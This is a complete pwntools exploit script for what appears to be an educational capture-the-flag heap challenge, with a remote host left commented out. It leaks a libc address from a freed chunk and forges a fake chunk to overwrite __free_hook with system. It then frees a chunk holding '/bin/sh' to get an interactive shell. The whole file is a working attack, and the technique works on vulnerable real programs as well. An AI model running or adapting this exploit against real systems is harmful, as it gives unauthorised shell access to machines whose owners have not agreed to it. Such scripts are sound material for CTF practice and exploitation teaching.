from pwn import *

context.arch = 'amd64'


def add(p, index, name):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'> ', index)
    p.sendlineafter(b'> ', name)
    return


def edit(p, index, size, content):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', index)
    p.sendlineafter(b'> ', size)
    p.sendline(content)


def delete(p, index):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', index)


def show(p):
    p.sendlineafter(b'> ', b'4')


#p = remote('edu-ctf.zoolab.org', '10007')
p = process('./chal')
add(p, b'0', b'A' * 8)
edit(p, b'0', b'1048', b'A')
add(p, b'1', b'B' * 8)
edit(p, b'1', b'24', 'B')
add(p, b'2', b'C' * 8)
delete(p, b'0')
show(p)
p.recvuntil('data: ')
libc = u64(p.recv(6).ljust(8, b'\x00')) - 2018272
free_hook = libc + 2027080
system = libc + 336528
info(f'libc: {hex(libc)}')

fake_chunk = flat(
    0,
    0x21,
    b'CCCCCCCC',
    b'CCCCCCCC',
    free_hook,
)

data = b'/bin/sh\x00'.ljust(0x10, b'B')
edit(p, b'1', b'56', data + fake_chunk)
edit(p, b'2', b'8', p64(system))

p.interactive()
